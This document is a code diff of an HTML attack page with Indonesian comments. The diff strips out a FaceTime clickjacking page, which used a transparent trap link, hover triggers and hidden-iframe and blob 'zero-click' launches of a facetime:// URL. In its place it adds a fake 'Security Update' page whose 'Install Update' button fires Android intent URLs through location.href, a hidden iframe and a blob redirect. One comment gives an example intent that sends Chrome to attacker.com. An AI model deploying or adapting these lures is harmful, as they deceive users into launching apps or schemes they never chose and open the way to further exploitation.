@@ -3,57 +3,43 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Verification</title>
+<title>System Update</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #f4f6f8;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, sans-serif;
     display: flex; justify-content: center; align-items: center;
     height: 100vh; margin: 0; flex-direction: column;
   }
   .panel {
     background: #fff; padding: 40px; border-radius: 12px;
     box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
-    max-width: 400px; width: 100%; position: relative;
+    max-width: 400px; width: 100%;
   }
   h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
   p { color: #666; margin-bottom: 20px; font-size: 14px; }
-  .fake-btn {
+  button {
     background: #007aff; color: #fff; padding: 15px 30px;
     border-radius: 8px; font-size: 18px; font-weight: bold;
-    display: inline-block; position: relative; cursor: pointer;
-    user-select: none;
+    cursor: pointer; border: none; width: 100%;
   }
-  .fake-btn:hover { background: #005bb5; }
-
-  /* Link Transparan Clickjacking */
-  .trap-link {
-    position: absolute; top: 0; left: 0;
-    width: 100%; height: 100%;
-    opacity: 0; cursor: pointer; z-index: 10;
-  }
-
+  button:hover { background: #005bb5; }
   #log {
     margin-top: 20px; background: #000; color: #0f0;
     padding: 10px; font-family: monospace; font-size: 12px;
     border-radius: 6px; width: 100%; max-width: 400px;
-    height: 120px; overflow-y: auto; text-align: left;
+    height: 100px; overflow-y: auto; text-align: left;
   }
-  iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel">
-  <h1>📹 FaceTime Security Check</h1>
-  <p>Gerakkan pointer atau klik tombol untuk memverifikasi identitas Anda.</p>
+  <h1>🔒 Security Update</h1>
+  <p>Klik tombol di bawah untuk memperbarui sistem.</p>
   
-  <div class="fake-btn" id="btnWrapper">
-    Verify Identity
-    <!-- SKEMA FACETIME YANG VALID -->
-    <a href="facetime://security@apple.com" class="trap-link" id="trapLink"></a>
-  </div>
+  <!-- Tombol Pemicu Intent Redirection -->
+  <button id="intentBtn">Install Update</button>
 </div>
 
 <div id="log">Sistem siap...</div>
@@ -63,99 +49,72 @@
   'use strict';
 
   var logEl = document.getElementById('log');
-  var trapLink = document.getElementById('trapLink');
-  var hasTriggered = false;
-
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
     console.log(msg);
   }
 
-  // Skema FaceTime Target
-  var targetScheme = "facetime://security@apple.com";
-
   // ============================================
-  // 1. ZERO-CLICK TRIGGER (IFRAME SANDBOX)
+  // 1. INTENT REDIRECTION VECTOR (ANDROID)
   // ============================================
-  function zeroClickIframe() {
-    if (hasTriggered) return;
-    try {
-      var iframe = document.createElement('iframe');
-      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups allow-same-origin";
-      iframe.style.display = "none";
-      
-      iframe.srcdoc = `
-        <script>
-          try { window.top.location.href = "${targetScheme}"; } catch(e) {}
-        <\/script>
-      `;
-      document.body.appendChild(iframe);
-      log("[Zero-Click] Iframe Sandbox trigger sent.");
-    } catch(e) { log("[Zero-Click] Gagal: " + e.message); }
-  }
-
-  // ============================================
-  // 2. ZERO-CLICK TRIGGER (BLOB WRAPPER)
-  // ============================================
-  function zeroClickBlob() {
-    if (hasTriggered) return;
-    try {
-      var blobPayload = `<script>window.top.location.href = "${targetScheme}";<\/script>`;
-      var blob = new Blob([blobPayload], { type: 'text/html' });
-      var url = URL.createObjectURL(blob);
-      
-      var iframe = document.createElement('iframe');
-      iframe.style.display = "none";
-      iframe.src = url;
-      document.body.appendChild(iframe);
-      log("[Zero-Click] Blob Wrapper trigger sent.");
-    } catch(e) { log("[Zero-Click] Blob gagal: " + e.message); }
-  }
-
-  // ============================================
-  // 3. POINTER HOVER TRIGGER (mousemove)
-  // ============================================
-  document.body.addEventListener('mousemove', function(e) {
-    if (hasTriggered) return;
-    
-    var x = e.clientX;
-    var y = e.clientY;
-    
-    // Jika pointer mendekat ke area tombol
-    if (x > window.innerWidth / 2 - 150 && x < window.innerWidth / 2 + 150 &&
-        y > window.innerHeight / 2 - 150 && y < window.innerHeight / 2 + 150) {
-      hasTriggered = true;
-      log("[Hover] Pointer mendekat. Memicu FaceTime...");
-      
-      // Trigger via trapLink click
-      trapLink.click();
-    }
-  });
-
-  // ============================================
-  // 4. GESTURE BYPASS (RACE CONDITION ON CLICK)
-  // ============================================
-  document.getElementById('btnWrapper').addEventListener('click', function() {
-    if (hasTriggered) return;
-    hasTriggered = true;
-    
-    log("[Click] Gesture terdeteksi. Memicu FaceTime (Race Condition)...");
-    
-    queueMicrotask(function() {
-      try {
-        window.location.replace(targetScheme);
-      } catch(e) { log("[Click] Gagal: " + e.message); }
-    });
-  });
-
-  // ============================================
-  // 5. TRIGGER CHAIN (EKSEKUSI OTOMATIS)
-  // ============================================
+  // Format umum: intent://host#Intent;scheme=...;package=...;end
+  // Celah: Beberapa browser Android mengizinkan Intent ke package internal
+  // tanpa verifikasi.
   
-  setTimeout(zeroClickIframe, 1000);
-  setTimeout(zeroClickBlob, 2000);
+  // Target: Android Settings (Bisa digunakan untuk eksploitasi lebih lanjut)
+  // Atau: intent://webview?url=https://attacker.com#Intent;package=com.android.chrome;end
+  
+  var targetIntent = "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end";
+  // Atau gunakan: intent://settings#Intent;action=android.settings.SETTINGS;end
 
-  log("Payload FaceTime siap. Menunggu Zero-Click atau interaksi user...");
+  // ============================================
+  // 2. EKSEKUSI (Clickjacking / One Click)
+  // ============================================
+  document.getElementById('intentBtn').addEventListener('click', function() {
+    log("[!] Memicu Intent Redirection...");
+    
+    // Trik 1: Location.href (Langsung)
+    try {
+      window.location.href = targetIntent;
+      log("[+] Intent dieksekusi via location.href.");
+    } catch(e) {
+      log("[-] Gagal: " + e.message);
+    }
+
+    // Trik 2: Iframe tersembunyi (Zero-Click Iframe)
+    setTimeout(function() {
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = targetIntent;
+      document.body.appendChild(iframe);
+      log("[+] Intent via Iframe dicoba.");
+    }, 500);
+
+    // Trik 3: Blob Wrapper (Untuk iOS/Safari)
+    // Safari kadang membuka intent dari blob: URL
+    setTimeout(function() {
+      try {
+        var blobPayload = `<script>window.location.href = "${targetIntent}";<\/script>`;
+        var blob = new Blob([blobPayload], { type: 'text/html' });
+        var url = URL.createObjectURL(blob);
+        window.location.replace(url);
+        log("[+] Intent via Blob dicoba.");
+      } catch(e) {}
+    }, 1000);
+  });
+
+  // ============================================
+  // 3. ZERO-CLICK ATTEMPT (Diblokir Browser Modern)
+  // ============================================
+  // Mencoba mengeksekusi Intent tanpa klik (Zero-Click)
+  setTimeout(function() {
+    log("[Zero-Click] Mencoba Intent tanpa klik...");
+    var iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = targetIntent;
+    document.body.appendChild(iframe);
+    // (Chrome Android akan memblokir ini secara senyap)
+  }, 2000);
 
 })();
 </script>
